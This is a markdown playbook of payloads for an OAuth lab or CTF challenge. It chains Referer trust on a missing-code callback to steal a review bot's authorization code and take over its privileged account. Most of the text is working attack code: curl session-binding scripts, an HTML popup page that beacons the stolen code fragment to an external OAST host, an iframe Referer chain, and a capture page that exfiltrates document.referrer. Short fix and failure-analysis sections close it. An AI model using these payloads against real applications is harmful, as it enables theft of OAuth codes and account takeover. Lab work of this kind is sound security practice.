# Referer Trust Missing-Code Callback — Review Bot Code Exfil

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- `GET /callback?state=<Sa>` **without** `code=` reflects or exchanges based on **Referer** containing `callback?code=...`
- OAuth `state` is plain token (e.g. 32-hex) bound when attacker is logged in and mints homepage link
- **No** `/auth` staged-code route (rules out sl2 CSRF-only chain)
- **No** `/error` + DOMPurify state HTMLi (rules out sl1)
- **No** `/logger` postMessage (rules out sl3)
- reviewer bot accepts URLs via `POST /report`
- bot IdP session supports `prompt=none`
- flag requires **reviewer** identity, not default `pwnu` user

Do **not** use when:

- sl2 `/init` + `/auth` works without code theft
- sl1 base64 JSON `state.message` + `/error` page exists
- callback immediately 302s to profile on all contexts (no iframe conflict path)

## Prerequisites

```bash
APP='https://[app-host]'
IDP='https://[idp-host]'
CLIENT_ID='[oauth-client-id]'

# Load L30 Tools API from workspace .env
# OAST session + subkeeper host required for exfil polling
```

Attacker session setup:

```bash
# 1. First login — MUST follow redirects for session cookie
curl -sS -c cookies.txt "$APP/" -o /dev/null
SA0=$(curl -sS -b cookies.txt "$APP/" | grep -oP 'state=\K[a-f0-9]+' | head -1)

LOC=$(curl -sS -b cookies.txt -c cookies.txt -X POST "$IDP/o/oauth2/v2/auth" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "client_id=$CLIENT_ID" \
  --data-urlencode "redirect_uri=${APP}/callback" \
  --data-urlencode 'response_type=code' \
  --data-urlencode 'scope=openid email profile' \
  --data-urlencode "state=$SA0" \
  --data-urlencode 'username=pwnu' \
  --data-urlencode 'password=pwnp' \
  -D - -o /dev/null | grep -i '^location:' | tr -d '\r' | cut -d' ' -f2)

curl -sS -b cookies.txt -c cookies.txt -L "$LOC" -o /dev/null

# 2. Bind fresh state while logged in — do NOT oauth with this state yet
SA=$(curl -sS -b cookies.txt "$APP/" | grep -oP 'state=\K[a-f0-9]+' | head -1)
echo "BOUND_STATE=$SA"
```

## Payload A — Referer-only exchange (after code theft)

```bash
STOLEN='[reviewer_authorization_code]'
SA='[bound_state]'

curl -sS -b cookies.txt \
  -H "Referer: ${APP}/callback?code=${STOLEN}&state=${SA}" \
  -L "${APP}/callback?state=${SA}"

curl -sS -b cookies.txt "$APP/profile" | grep -E '<h1|pwnbox\{'
```

**Expected with reviewer code:** privileged identity (lab: Statue of God) + flag.  
**Observed with pwnu code:** Sung Jinwoo only.

## Payload B — Reviewer OAuth URL (direct report)

**Not sufficient alone** — plain `code` happy path consumes authorization code server-side.

```text
[IDP]/o/oauth2/v2/auth
  ?client_id=[CLIENT_ID]
  &redirect_uri=[APP]/callback
  &response_type=code
  &scope=openid email profile
  &prompt=none
  &state=[BOUND_STATE]
```

Use only as control; prefer Payload F (hybrid popup).

## Payload F — Hybrid popup fragment exfil (confirmed working — Voorivex)

Host on subkeeper. Bot visits via single `/report`.

```html
<!doctype html>
<html><body>
<script>
function leak(d){ new Image().src="https://[oast-host]/cap?d="+encodeURIComponent(d); }
function check(){
  var h=location.hash||"";
  if (h.indexOf("code=")>=0) leak(h+"|ref="+document.referrer);
}
check(); setInterval(check, 300);
window.open(
  "[IDP]/o/oauth2/v2/auth?client_id=[CLIENT_ID]"
  + "&redirect_uri=" + encodeURIComponent("[APP]/callback")
  + "&response_type=code+token"
  + "&scope=openid%20email%20profile"
  + "&prompt=none"
  + "&state=[BOUND_STATE]",
  "", "width=1,height=1"
);
</script>
</body></html>
```

**Why it works:** Hybrid IdP response lands on `/callback#code=R&access_token=...`. Non-happy path client-redirects popup to opener origin with fragment intact. Hash beacon exfiltrates reviewer code.

**Do not:** use `response_type=code` only; do not manually set `w.location` to cross-origin callback (blocked).

After OAST captures `code=R`, run Payload A (Referer exchange).

## Payload C — Iframe Referer reflect chain (subkeeper exploit page)

Host on subkeeper (`*.l30on.top`). Bot visits exploit URL via `/report`.

```html
<!doctype html>
<html><body>
<iframe id="f" src="[OAUTH_URL_WITH_prompt_none_and_BOUND_STATE]"></iframe>
<script>
const APP = '[APP_ORIGIN]';
const SA  = '[BOUND_STATE]';
const CAP = 'https://[capture-sub].l30on.top/';

let step = 0;
function chain() {
  const f = document.getElementById('f');
  if (step === 0) {
    step = 1;
    f.src = APP + '/callback?state=' + SA;
  } else if (step === 1) {
    step = 2;
    f.src = CAP + '?' + Date.now();
  }
}
document.getElementById('f').onload = () => setTimeout(chain, 500);
setTimeout(chain, 12000);
</script>
</body></html>
```

Capture page (separate subkeeper):

```html
<!doctype html>
<script>
var r = document.referrer || '';
if (r) new Image().src = 'https://[oast-host]/cap?r=' + encodeURIComponent(r);
</script>
```

**Why:** After oauth, iframe is at `APP/callback?code=R&state=Sa`. Navigating to `callback?state=Sa` sends Referer with code; server reflects full callback URL; navigating iframe to attacker origin exposes `document.referrer` with `code=`.

**Timing:** 10–12s fallback if `onload` does not fire across cross-origin redirects.

## Payload D — Top-level Referer beacon (auxiliary)

```html
<img referrerpolicy="unsafe-url" src="https://[oast-host]/beacon">
<iframe id="f" src="[OAUTH_URL]"></iframe>
```

Useful when conflict page keeps `code=` in URL and parent page can load OAST with unsafe Referer. On sl4 `ed30ab23e109`, OAST saw exploit-host Referer only — not sufficient alone.

## Payload E — Keeper portrait sinks (passive confirmation)

Lab may hardcode portrait URLs:

```text
https://l30on.top/k/reviewer-avatar
https://l30on.top/k/reviewer
https://l30on.top/k/statue
https://l30on.top/k/statue-avatar
```

Poll keeper logs for HeadlessChrome hits after `/report` — confirms multi-account conflict page rendered. **Does not** return Referer in API; still need OAST or capture page for code.

## Requirements

| Requirement | Reason |
|-------------|--------|
| Logged-in `connect.sid` before bind | Referer exchange needs attacker session |
| Unspent bound `Sa` | Bot must use same state |
| Single `/report` per attempt | Multiple reports may confuse bot |
| Hybrid `response_type` (`code+token`) | Plain `code` happy path does not leak |
| `window.open` from exploit origin | Non-happy path bounces popup to opener with `#code=` |
| Reviewer bot IdP session | `prompt=none` without bot → pwnu identity |
| OAST hash beacon on exploit page | Keeper logs lack Referer; iframe Referer chain failed |

## Why Failed Payloads Failed (sl4 testing)

| Payload | Failure reason |
|---------|----------------|
| `code` popup + manual `w.location=callback?state=Sa` | Cross-origin blocked; OAST got `\|ref=` only (task 774615) |
| Direct OAuth report + OAST | Top-level happy path consumes code |
| Fixed-delay iframe chain to OAST | Referer-Policy — OAST got parent URL only |
| Local `prompt=none` code + Referer exchange | Code maps to pwnu (Sung Jinwoo), not reviewer |
| Keeper redirect_url → OAST | Keeper returns 200 static body, not 302 |
| Hybrid without hash polling on opener | Fragment on popup until non-happy bounce to opener |

## Impact

- Theft of reviewer OAuth authorization code → account takeover of privileged identity
- Open redirect via Referer reflection (secondary)

## Fix

- Reject missing-code callback unless code is in query/body
- Never reflect Referer into Location
- `Referrer-Policy: no-referrer` on callback/conflict pages
- `referrerpolicy="no-referrer"` on all portraits during OAuth flows
- Bind state to session + PKCE

## Related

- `notes/oauth-referer-trust-missing-code-callback-multi-account-gate.md`
- `checklists/oauth-referer-trust-missing-code-recon.md`
- `labs/2026-07-11-solo-leveling-referer-gate-oauth-referer-leak.md`
- sl1: `payloads/oauth/dompurify-referrerpolicy-state-message-referer-exfil.md`
- sl2: `payloads/oauth/crafted-oauth-link-csrf-review-bot.md`
